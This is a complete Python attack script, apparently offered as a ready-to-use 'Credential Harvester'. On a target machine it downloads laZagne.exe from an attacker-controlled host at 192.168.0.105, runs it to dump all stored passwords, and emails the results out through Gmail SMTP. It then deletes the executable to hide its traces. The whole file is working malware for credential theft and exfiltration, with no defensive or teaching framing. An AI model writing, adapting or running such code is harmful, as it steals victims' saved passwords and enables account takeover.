#!/usr/bin/env python
import smtplib
import requests
import subprocess
import os
import tempfile
import time
from colorama import init, Fore		# for fancy/colorful display

# Target Script
class Credential_harvestor:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.RESET = Fore.RESET

    def download(self, url):
        response = requests.get(url)
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as file:
            file.write(response.content)

    def send_mail(self, email, password, msg):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg)
        server.quit()

    def display(self):
        if 'nt' in os.name:
            subprocess.call('cls', shell=True)
        else:
            subprocess.call('clear', shell=True)

        print('{}\n\n\t\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
        print('\n{}\t\t\t\t\t\t#\t            Credential Harvester!\t\t#\n{}'.format(self.Cyan, self.RESET))
        print('{}\t\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

    def start(self):
        self.display()
        temp_dir = tempfile.gettempdir()
        os.chdir(temp_dir)
        self.download('http://192.168.0.105/evil_files/laZagne.exe')
        print('\n\n{}[+] File Successfully Downloaded On The Target System ...{}'.format(self.GREEN, self.RESET))
        result = subprocess.check_output('laZagne.exe all ', shell=True)
        self.send_mail('your-email', 'your-password', result)
        print('\n{}[+] Reporting ...{}'.format(self.RED, self.RESET))
        time.sleep(1)
        os.remove('laZagne.exe')
        print('\n{}[+] Exitting ...{}\n'.format(self.Yellow, self.RESET))
        time.sleep(1)

if __name__ == "__main__":
    harvestor = Credential_harvestor()
    harvestor.start()

